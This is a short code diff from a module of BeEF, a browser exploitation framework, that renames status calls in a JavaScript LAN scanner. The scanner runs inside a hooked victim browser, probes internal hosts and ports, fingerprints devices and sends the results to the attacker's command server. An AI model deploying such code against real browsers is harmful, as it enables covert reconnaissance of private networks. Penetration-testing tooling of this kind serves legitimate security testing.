@@ -9,7 +9,7 @@ beef.execute(function() {
 
 	if(!beef.browser.isFF() && !beef.browser.isS()){
 		beef.debug("[command #<%= @command_id %>] Browser is not supported.");
-		beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.status.error());
 		return;
 	}
 
@@ -354,12 +354,12 @@ beef.execute(function() {
 	lanScanner.addHost = function(obj) {
 		this.timeout = 0;
 		beef.debug("[JS LAN Scanner] Found "+this.getPortName(obj.port)+" [proto: http, ip: "+obj.host+", port: "+obj.port+"]");
-		beef.net.send("<%= @command_url %>", <%= @command_id %>, 'proto=http&ip='+obj.host+'&port='+obj.port+'&service='+this.getPortName(obj.port), beef.are.status_success());
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, 'proto=http&ip='+obj.host+'&port='+obj.port+'&service='+this.getPortName(obj.port), beef.status.success());
 		lanScanner.fingerPrint(obj.host);
 	}
 	lanScanner.addDevice = function(obj) {
 		beef.debug("[JS LAN Scanner] Found " + obj.make + ' ' + obj.model + ' [ip: ' + obj.host + ']');
-		beef.net.send("<%= @command_url %>", <%= @command_id %>, 'ip='+obj.host+'&device='+obj.make+' '+obj.model, beef.are.status_success());
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, 'ip='+obj.host+'&device='+obj.make+' '+obj.model, beef.status.success());
 	}
 	lanScanner.destroyConnections = function() {
 		var guessesLen = guesses.length;
